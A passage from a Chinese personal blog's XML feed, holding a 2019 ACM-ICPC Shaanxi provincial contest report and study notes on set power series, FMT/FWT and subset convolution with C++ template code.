图的转置通常可以构造出新的分拆，成为分拆的共轭。共轭为自身的分拆如何计数呢？沿着主对角线看去，一层层拆开，那么共轭为自身的分拆个数就是拆分成互不相同的奇数的方案数，两者一一对应。</li></ol><p>另一个有趣发现：因数和函数 $\sigma(n)$ 也可以和拆分数一样递推，只是规定考虑 $\sigma(n)$ 时，如果后面的项里有 $\sigma(0)$ ，就视为 $n$ ，而不是 1 。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;如果看到了下面的数列，就要保持警惕了！！！&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1, 1, 2, 3, 5, 7, 11, 15, 22, 30&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="http://yangdong2002.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
  </entry>
  
  <entry>
    <title>2019年ACM-ICPC陕西省赛游记</title>
    <link href="http://yangdong2002.github.io/2019/06/03/2019%E5%B9%B4ACM-ICPC%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B%E6%B8%B8%E8%AE%B0/"/>
    <id>http://yangdong2002.github.io/2019/06/03/2019%E5%B9%B4ACM-ICPC%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B%E6%B8%B8%E8%AE%B0/</id>
    <published>2019-06-03T04:15:01.000Z</published>
    <updated>2019-06-07T11:42:44.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="游记"><a href="#游记" class="headerlink" title="游记"></a>游记</h1><p>夺冠了！作为和  <font color=red><b>nocriz</b></font>，<font color=red><b>hdmmblz</b></font> 一起组队打的第一场比赛，这也算是一个开门红吧，这次的解题策略与团队合作等诸多方面都做得还不错，出的锅也不算特别多。不过这也仅仅是一个省赛，仅仅是一个起点，以后的路还长，以后的目标需要远大！我们有了方向，有了动力，更有了顶天立地的决心。</p><span id="more"></span><p>不过这次去除两个高中打星队我们才夺的冠，那两个队一个 11 题，一个 10 题，还是被高中省队爷吊打了啊，感觉还是要提高啊。（被“丁教练”教育了qaq）</p><p><img src="education-1.jpg" alt="被教育现场1"> </p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>上午 06:40 就早早地起床，集合，前往 XDU。路上水掉了 wzk 讲的一个张好风出的构造题，感觉海星。</p><p>到了 XDU ，拿好衣服之后打了一个极为自闭的热身赛。首先是发现电脑的 Ubuntu 双系统里面居然没有 vim，没有各种常见编辑器，打算换用 gedit 之后，发现居然没有网络，无法查看题面。一阵忙乱之中我们又改用 windows + Dev-cpp，结果发现电脑又没有 python，g++也没有加入 PATH 环境变量里。这时开始看热身赛的题目，wzk 几分钟秒掉了 A ，我提出了 B 题最短路+欧拉回路的做法，然而<strong>没有人熟悉欧拉回路怎么写</strong>！！！稍微讨论回忆了一下，构思好代码之后 wzk 开始写。cyy 和我思博了，一直对着 C 题自闭。最后 B 没写出来， C 也没做出来。结果 wzk 赛后直接一眼秒掉了 C。总的来看，热身赛什么环境也没来得及测，题目也只 A 了一道，感觉主要就是用来 rp++ 了。</p><p>下图是我们比赛的机位：</p><p><img src="place.jpg" alt="我们的机位（真乱！）"></p><h2 id="正赛"><a href="#正赛" class="headerlink" title="正赛"></a>正赛</h2><p>参加完豪华<del>（简单）</del>的露天开幕式之后马上就要正赛了，感觉心里还蛮没底的。稍微调整了下状态，比赛开始了（喂，比赛没开始为什么大家都开始启封试题册了啊！）。wzk 悄悄以惊人的手速 10 分钟 <strong>1A 了三道签到题EFL</strong> 并拿到了 E  题的一血，简直太强了，这三道题我场上甚至根本没看。</p><p>之后开始多线程， wzk 看 C 写 C，结果 wa 了；这大概经过了 20 分钟，与此同时我和 cyy 互相交换了 H，I，J 三道题的题意。I 题稍微讨论了一下就会了，wzk 打印了 C 题代码，cyy 给 wzk 讲了 I ，wzk 开始写。我发现 H 是擅长的构造，我又发现这题和华东师大校赛的 C 题极为相似，于是决定仔细想 H，过了一会儿就会做了，给 cyy 讲了做法，cyy 觉得很正确，于是我仔细构思了下代码，觉得很好写。wzk 写好 I了，可是 wa 了，找出了好几个细节错误。打印代码后，我上机写 H。cyy 和 wzk 一起小黄鸭，发现了所有错误，改了之后提交，总算<strong>通过了 I 题</strong>，并拿到了一血。过了一会儿，我写完了 H ，测了测样例，手测几组数据，觉得稳得很，于是提交，<strong>1A了 H 题</strong>，并且还拿到了这道题一血。这时我们的士气很高涨，排在 rank 1，I，H 题仅仅有我们队通过，第二名仅仅才 4 道题，拿了两个一血，时间也才仅仅过去 74 分钟。</p><p>继续多线程，wzk 发现交大“免费赠送AC帽”队拿到了 B 题的一血，于是跟了下榜，发现是思博题，于是开始写。cyy 提出几种 J 做法，感觉找到了靠谱做法了，于是又屯下一题。wzk <strong>A掉了 B 题</strong>，cyy 开始给 wzk 讲 J 题，我把没看的题目都看了一遍，主要在想 D 题。wzk 开写 B 了，cyy 提出 K 题解法，但是我有点怀疑正确性。wzk J 题神秘地 TLE 了，在我<del>强烈</del>要求下不辞辛劳把 <code>cin</code> 改为了 <code>fread+getchar</code> ，又手动开了 O3，Ofast，然后就神奇<strong>通过了 J 题</strong>。wzk 确认了 cyy K 题解法的正确性，cyy 上机写 K 题，用了 20 多分钟也写好<strong>过掉了 K 题</strong> 。</p><p>与此同时，我一直在试图对 D 题进入大型分类讨论。我分了一维三种情况以及二位的六种情况，都将思路整理到之上了。wzk 建议看一看 C ，这时我们才意识到 WA 了很久扔在那里的题目。wzk 打算写 A 题试一试，我和 cyy 想了 C 的一些假做法，最后得到的结论 wzk 说就是当时 wa 的代码的思路。我发现有个小情况忘记考虑了，加上去之后大家不太相信正确性，可是我觉得很稳，结果<strong>交上去就 AC 了C题</strong>。</p><p>这时已经封榜了，我们手上有DAG三道题，有 40 分钟的时间。D题所有情况已经讨论完成了，A 题wzk写好了，但是交上去铁定会 TLE。wzk 试图优化 A ，可是没什么头绪。 D 题代码量巨大，细节繁琐，我硬着头皮上去写，cyy 在旁别即时检查。结果最后 2 分钟终于写完了代码，可是没时间调试了，直接交上去 WA 了，本地测了下也过不了样例，没有办法了，被高中生吊打了。</p><p><img src="my-score.jpg" alt="最终提交情况"></p><p>比较幸运的是，正式选手中我们还是拿到了 rank 1，拿到了冠军奖杯。（免费赠送AC帽队第四，他们差点就也 9 题了，真为他们可惜 qwq）</p><p><img src="champion.jpg" alt="champion"></p><p>总的来看：</p><ul><li>Solved during contest: <code>9/12</code> </li><li>Upsolved: <code>9/12</code></li><li>Orally upsolved: <code>9/12</code></li><li>Rank: <code>1/105</code> (Official), <code>3/111</code> (Full rank)</li></ul><p>出现的问题集锦：</p><ul><li>（热身赛）没有人会熟练实现欧拉回路</li><li>大数据读入时仍使用 <code>cin</code></li><li>C 题 wzk 开始想的是正解，结果因为小情况 wa 而误以为算法假了</li><li>最后一个小时还是划了，D 讨论得还是不全面，主要是没有信心，写代码的时候中途我掉线了。</li><li>A 题写好后以为会 TLE 就没有提交，但实际上复杂度是正确的。</li></ul><p>做得比较好的地方集锦：</p><ul><li>基本做到了多线程</li><li>让 wzk 去签到</li><li>快速做出了构造题</li><li>cyy 力排众议，写了 K 题看似无脑的做法通过了</li><li>每次提交前的检查还算仔细</li></ul><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><a href="http://acm.zju.edu.cn/onlinejudge/searchProblem.do?contestId=1&titlefrom=0&authorfrom=0&sourcefrom=0&query=The+2019+ICPC+China+Shaanxi+Provincial+Programming+Contest">Practice Link</a></p><p><a href="scoreboard.pdf">Score Board</a>：</p><div class="row">    <embed src="scoreboard.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;游记&quot;&gt;&lt;a href=&quot;#游记&quot; class=&quot;headerlink&quot; title=&quot;游记&quot;&gt;&lt;/a&gt;游记&lt;/h1&gt;&lt;p&gt;夺冠了！作为和  &lt;font color=red&gt;&lt;b&gt;nocriz&lt;/b&gt;&lt;/font&gt;，&lt;font color=red&gt;&lt;b&gt;hdmmblz&lt;/b&gt;&lt;/font&gt; 一起组队打的第一场比赛，这也算是一个开门红吧，这次的解题策略与团队合作等诸多方面都做得还不错，出的锅也不算特别多。不过这也仅仅是一个省赛，仅仅是一个起点，以后的路还长，以后的目标需要远大！我们有了方向，有了动力，更有了顶天立地的决心。&lt;/p&gt;</summary>
    
    
    
    <category term="游记" scheme="http://yangdong2002.github.io/categories/%E6%B8%B8%E8%AE%B0/"/>
    
    
    <category term="ICPC" scheme="http://yangdong2002.github.io/tags/ICPC/"/>
    
  </entry>
  
  <entry>
    <title>集合幂级数、FMT、FWT学习笔记</title>
    <link href="http://yangdong2002.github.io/2019/04/28/%E9%9B%86%E5%90%88%E5%B9%82%E7%BA%A7%E6%95%B0-FMT-FWT%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yangdong2002.github.io/2019/04/28/%E9%9B%86%E5%90%88%E5%B9%82%E7%BA%A7%E6%95%B0-FMT-FWT%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2019-04-27T21:37:00.000Z</published>
    <updated>2021-04-20T15:28:44.036Z</updated>
    
    <content type="html"><![CDATA[<p>受这几天看到的不少高维前缀和题目的影响，我决定系统地学习一下集合幂级数的一套理论了。内容主要来自2015年吕凯风（VFleaKing）国家集训队论文《集合幂级数的性质与应用及其快速算法》（pdf版本会放在附录里），包括<strong>集合并卷积、集合对称差卷积、子集卷积、快速莫比乌斯变换、快速莫比乌斯反演、快速沃尔什变换及逆变换</strong>等，以及附带进行的一些练习。</p><p>(UPD 2021.4.20) 推荐观看：<a href="https://www.youtube.com/watch?v=lXJP-UkTl-4&list=PLm3J0oaFux3ZYpFLwwrlv_EHH9wtH6pnX&index=23">Fourier Analysis of Boolean functions || @ CMU || Lecture 8a of CS Theory Toolkit</a></p><span id="more"></span><p>[TODO] 把练习第一题搞清楚<br>[TODO] 把第三道论文题学会</p><h1 id="引言及定义"><a href="#引言及定义" class="headerlink" title="引言及定义"></a>引言及定义</h1><p>类似数列的生成函数，对于集合，我们引入集合幂级数来解决一些有关集合的动态规划问题。</p><blockquote><p>定义：设  $F$ 是一个域，则称函数 $f:2^U\to F$ 是 F 上的一个形式幂级数，记 $f_S=f(S)$ 为集合幂级数第 $S$ 项的系数。</p></blockquote><p>我们记为：<br>$$<br>f=\sum_{S\subseteq 2^U} f_S x^S<br>$$<br>显然可以定义集合幂级数的加法：$(f+g)(S) = f(S)+g(S)$ ，减法也类似。这两种运算都是 $O(2^n)$ 的。</p><p>如何定义乘法？为了保证乘法对加法的分配律，若 $h=f\cdot g$ ，我们应该有：<br>$$<br>\sum_{S\in 2^U} h_S x^S = \big(\sum_{L\in2^U}f_Lx^L\big) \cdot (\sum_{R\in 2^U} g_R x^R) = \sum_{L\in 2^U} \sum_{R\in 2^U} (f_L x^L) \cdot (g_R x^R)<br>$$<br>因此我们只需要规定 $(f_L x^L) \cdot (g_R x^R)$ 的运算结果，我们希望它是以某种集合运算乘起来的。我们设一个 $2^U$ 中满足交换律、结合律、空集是单位元的二元运算 $\ast$ ，那么我们就可以定义 $(f_L x^L) \cdot (g_R x^R) = (f_L g_R) x^{L\ast R}$ 。至此集合幂级数形成了一个交换环，并且包含了整个 $F$ 作为子环。</p><p>常见定义 $\ast$ 为集合并运算、集合对称差运算以及子集卷积，我们一一解决。</p><h1 id="集合并卷积（FWT-or）"><a href="#集合并卷积（FWT-or）" class="headerlink" title="集合并卷积（FWT_or）"></a>集合并卷积（FWT_or）</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>即给出两个集合幂级数 $f,g$ ，求 $h = f\ast g$  满足：<br>$$<br>h_S = \sum_{L\subseteq 2^U} \sum_{R\subseteq 2^U} [L\cup R = S] f_L g_R \tag{1}<br>$$<br>怎么做呢？暴力做是 $O(4^n)$ 的，一种做法是分治乘法，可是总感觉在理论价值上面会逊色一些。有没有类似 FFT 的一种变换，使得变换后将卷积直接变成点乘呢？莫比乌斯变换做到了这一点。</p><p>我们定义集合幂级数 $f$ 的莫比乌斯变换 $\hat{f} $为：<br>$$<br>\hat{f_S} = \sum_{T\subseteq S} f_T<br>$$<br>反过来，如何求莫比乌斯逆变换呢（常常称为莫比乌斯反演）？<a href="http://vfleaking.blog.uoj.ac/slide/87#/23">有关反演看这里：《炫酷反演魔术》</a>。很容易由容斥原理，我们又有：（这一步建议在纸上推导一下，要不然可能会觉得不直观）<br>$$<br>f_S = \sum_{T\subseteq S} (-1)^{|S|-|T|} \hat{f_T}<br>$$<br>现在，我们可以解决 (1) 中的问题了。对 (1) 式的左右两边同时做莫比乌斯变换<br>$$<br>\begin{aligned}<br>\hat{h_S} &amp; = \sum_{L\subseteq 2^U} \sum_{R\subseteq 2^U} [L\cup R \subseteq S] f_L g_R\<br>&amp; = \sum_{L\subseteq 2^U} \sum_{R\subseteq 2^U} [L\subseteq S][ R \subseteq S] f_L g_R\<br>&amp; = (\sum_{L\subseteq S}f_L) (\sum_{R\subseteq S}g_R)\<br>&amp; = \hat{f_S}\hat{g_S}<br>\end{aligned}<br>$$<br>因此，我们想要的性质是成立的。只需要把 $f,g$ 做莫比乌斯变换，点乘起来，然后再做莫比乌斯反演即可得到集合并卷积。</p><p>如何进行莫比乌斯变换呢？可以使用递推，设 $\hat f^{(i)}<em>S$ 表示只考虑 $S\oplus T\subseteq {1,\cdots,i}$ 的子集 $T$ 时的莫比乌斯变换第 $S$ 项，令 $\hat f_S^{(0)} = f_S$ ，那么对于每个不包含 $i$ 的 $S$ 有：<br>$$<br>\hat{f_S^{(i)}} = \hat{f_S}^{(i-1)}\<br>\hat{f}</em>{S\cup{i}} ^{(i)} = \hat f_{S\cup{i}}^{(i-1)} + \hat f _S ^{(i-1)}<br>$$<br>由此递推计算即可。复杂度 $O(n2^n)$</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>代码非常简短，<code>dmt</code> 变量为 1 时表示正变换，为 -1 时表示逆变换。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">fmt_or</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; A, <span class="keyword">int</span> dmt = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; m; ++S) <span class="keyword">if</span>(~S&gt;&gt;i&amp;<span class="number">1</span>)</span><br><span class="line">            A[S|(<span class="number">1</span>&lt;&lt;i)] = mo(A[S|(<span class="number">1</span>&lt;&lt;i)] + dmt*A[S]);</span><br><span class="line">    <span class="keyword">return</span> A;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="集合交卷积（FWT-and）"><a href="#集合交卷积（FWT-and）" class="headerlink" title="集合交卷积（FWT_and）"></a>集合交卷积（FWT_and）</h1><p>由于 $S\cap T = C_U(\bar S \cup \bar T)$，因此将S、T翻转之后，可以直接用FWT_or导出。可是实际上还有更简洁的实现，如下面代码所示。</p><p>复杂度 $O(n2^n)$</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">fmt_and</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; A, <span class="keyword">int</span> dmt = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; m; ++S) <span class="keyword">if</span>(~S&gt;&gt;i&amp;<span class="number">1</span>)</span><br><span class="line">            A[S] = mo(A[S] + dmt*A[S|(<span class="number">1</span>&lt;&lt;i)]);</span><br><span class="line">    <span class="keyword">return</span> A;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="集合对称差卷积（FWT-xor）"><a href="#集合对称差卷积（FWT-xor）" class="headerlink" title="集合对称差卷积（FWT_xor）"></a>集合对称差卷积（FWT_xor）</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>这一回把 $\ast$ 定义为集合对称差。即给出两个集合幂级数 $f,g$ 求 $h = f\ast g$  ：<br>$$<br>h_S = \sum_{L\subseteq 2^U} \sum_{R\subseteq 2^U} [L\oplus R=S] f_L g_R \tag 2<br>$$<br>分治乘法在这里也是可行的，但是对应的变换方法是什么呢？这次我们使用快速沃尔什变换及其逆变换（本质上是高维 FFT）。</p><p>快速沃尔什变换：<br>$$<br>\hat{f_S} = \sum_{T\subseteq 2^U} f_T (-1) ^{|S\cap T|}<br>$$<br>其逆变换为：（我没有找到靠谱证明）<br>$$<br>f_S = \frac {1}{2^n}\sum_{T\subseteq 2^U} \hat{f_T}(-1)^{|S\cap T|}<br>$$<br>沃尔什变换是具体如何解决（2）式的问题的呢？我们基于下面的事实：<br>$$<br>\frac {1}{2^n}\sum_{T\subseteq 2^U} (-1)^{|S\cap T|} = [S=\oslash]<br>$$<br>化简过程如下：<br>$$<br>\begin{aligned}<br>h_S &amp; = \sum_{L\subseteq 2^U} \sum_{R\subseteq 2^U} [L\oplus R\oplus S = \oslash] f_L g_R\<br>&amp; = \sum_{L\subseteq 2^U} \sum_{R\subseteq 2^U} \frac{1}{2^n} \sum_{T\subseteq 2^n} (-1)^{|S\cap (L\oplus R \oplus S)|} f_l g_R\<br>&amp; = \sum_{L\subseteq 2^U} \sum_{R\subseteq 2^U} \frac{1}{2^n} \sum_{T\subseteq 2^n} (-1)^{|T\cap L|} (-1)^{|T\cap R|}(-1)^{|T\cap S|} f_l g_R\<br>&amp; = \frac{1}{2^n} \sum_{T\subseteq 2^n} (-1)^{|T\cap S|} \Big(\sum_{L\subseteq 2^U} (-1)^{|T\cap L|} f_L\Big)<br>\Big(\sum_{R\subseteq 2^U} (-1)^{|T\cap R|} g_R\Big)\<br>&amp; = \frac{1}{2^n} \sum_{L\subseteq 2^U} (-1)^{|L\cap S|} \hat{f_S} \hat{g_S}<br>\end{aligned}<br>$$<br>即： $\hat{h_S} = \hat{f_S} \cdot \hat{g_S}$</p><p>注：在理论上，这种变换还有一个小问题，就是特征为2的 $F$ 上上述算法会失效，因为上述算法涉及乘以 $\frac {1}{2^n}$ 。不过一般情况下不会成问题。</p><p>接下来考虑如何计算快速沃尔什变换。依然可以使用递推，设 $\hat f^{(i)}<em>S$ 表示只考虑 $S\oplus T\subseteq {1,\cdots,i}$ 的子集 $T$ 时的沃尔什变换第 $S$ 项，令 $\hat f_S^{(0)} = f_S$ ，那么对于每个不包含 $i$ 的 $S$ 有：<br>$$<br>\hat{f_S^{(i)}} = \hat{f_S}^{(i-1)}+\hat{f}</em>{S\cup{i}}^{(i-1)}\<br>\hat{f}_{S\cup{i}} ^{(i)} = \hat f <em>S ^{(i-1)} - \hat f</em>{S\cup{i}}^{(i-1)}<br>$$<br>由此递推计算即可。复杂度 $O(n2^n)$</p><h2 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">fwt_xor</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; A, <span class="keyword">int</span> dmt = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l, r;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; m; ++S) <span class="keyword">if</span>(~S&gt;&gt;i&amp;<span class="number">1</span>) &#123;</span><br><span class="line">            l = A[S], r = A[S|(<span class="number">1</span>&lt;&lt;i)];</span><br><span class="line">            A[S] = mo(l + r);</span><br><span class="line">            A[S|(<span class="number">1</span>&lt;&lt;i)] = mo(l - r);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span>(dmt==<span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> inv2 = qpow(qpow(<span class="number">2</span>, MOD<span class="number">-2</span>), n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; m; ++S)</span><br><span class="line">            A[S] = muln(A[S], inv2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> A;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="子集卷积"><a href="#子集卷积" class="headerlink" title="子集卷积"></a>子集卷积</h1><p>这一部分感觉论文讲得有点自闭，推荐 <a href="https://www.cnblogs.com/Dance-Of-Faith/p/8818211.html">Dance Of Faith 的这篇博客</a> 。</p><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>考虑这种形式的卷积如何处理：<br>$$<br>h_S = \sum_{T\subseteq S} f_T g_{S-T} \tag 3<br>$$<br>实际上，这种卷积等价于定义 $\ast$ 为不相交集合的并，即<br>$$<br>L \ast R =<br>\begin{cases}<br>  \varnothing, &amp; L \cap R \neq \varnothing \<br>  L \cup R, &amp; \text{otherwise}<br>\end{cases}<br>$$<br>我们稍微改写一下 （3） 式：<br>$$<br>\begin{aligned}<br>h_S &amp; = \sum_{L\subseteq 2^U} \sum_{R\subseteq 2^U} [L\cap R = \varnothing] [L\cup R = S] f_L g_R \<br>&amp; =\sum_{L\subseteq 2^U} \sum_{R\subseteq 2^U} [|L| + |R| = |S|][L\cup R = S] f_L g_R<br>\end{aligned}<br>$$<br>我们只需要处理掉 $|L|+|R| = |S|$ 这一项。实际上我们直接加一维表示集合的大小，暴力处理即可。</p><p>具体来讲，初始时，我们先只把 $f_{pc(S),S}$ （<code>pc(S)</code> 表示 <code>popcount</code> ，即 S 二进制表示中有多少位是 1 ）的值赋成原来的 $f_{S}$（$g$ 也使用同样的操作），然后对每一个 $f_i$ 做一遍FMT，点值相乘时这么卷积：$h_{i, S} = \sum\limits_{j = 0}^{i} f_{j,S} * g_{i - j, S}$ 。代码很简洁，如下所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">subset_conv</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; A, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; B)</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">H</span><span class="params">(Len)</span></span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt; <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; siga(Base+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(Len,<span class="number">0</span>)), sigb = siga, sigh = siga;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; Len; ++S)</span><br><span class="line">        siga[pc[S]][S] = A[S], sigb[pc[S]][S] = B[S];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= Base; ++i) &#123;</span><br><span class="line">        fmt_or(siga[i], <span class="number">1</span>);</span><br><span class="line">        fmt_or(sigb[i], <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; Len; ++S)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; ++j)</span><br><span class="line">                sigh[i][S] = mo(sigh[i][S] + muln(siga[j][S], sigb[i-j][S]));</span><br><span class="line">        fmt_or(sigh[i], <span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> S = <span class="number">0</span>; S &lt; Len; ++S)</span><br><span class="line">        H[S] = sigh[pc[S]][S];</span><br><span class="line">    <span class="keyword">return</span> H;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>FWT_OR</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if FMT : f[S|(1&lt;&lt;i)] +&#x3D; f[S]</span><br><span class="line">if IFMT: f[S|(1&lt;&lt;i)] -&#x3D; f[S]</span><br></pre></td></tr></table></figure><p>FWT_AND</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if FMT : f[S] +&#x3D; f[S|(1&lt;&lt;i)]</span><br><span class="line">if IFMT: f[S] -&#x3D; f[S|(1&lt;&lt;i)]</span><br></pre></td></tr></table></figure><p>FWT_XOR：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">l &#x3D; f[S], r &#x3D; f[S|(1&lt;&lt;i)]</span><br><span class="line">f[S] &#x3D; l + r</span><br><span class="line">f[S|(1&lt;&lt;i)] &#x3D; l - r</span><br><span class="line">if IFMT: </span><br><span class="line">    f[S] &#x2F;&#x3D; qpow(2, n)</span><br></pre></td></tr></table></figure><p>子集卷积：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n + <span class="number">1</span>):</span><br><span class="line">    F[i] = FWT_OR(f[i])</span><br><span class="line">    G[i] = FWT_OR(g[i])</span><br><span class="line">    <span class="keyword">for</span> S <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, Len):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, i + <span class="number">1</span>):</span><br><span class="line">            H[i][S] += F[j][S] * G[i-j][S]</span><br><span class="line">    H[i] = IFWT_OR(H[i])</span><br><span class="line"><span class="keyword">for</span> S <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, Len):</span><br><span class="line">    h[S] = H[bc[S]][S]</span><br></pre></td></tr></table></figure><p>完整板子代码如下，由于没有采用类似 FFT 蝴蝶操作的优化，效率不是很高，在LOJ的子集卷积模板题上跑了 <code>4500/5000 ms</code>。<a href="https://www.luogu.org/problemnew/solution/P4717">Luogu 4717</a></p><div><div class="fold_hider"><div class="close hider_title">点击显示/隐藏代码</div></div><div class="fold"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 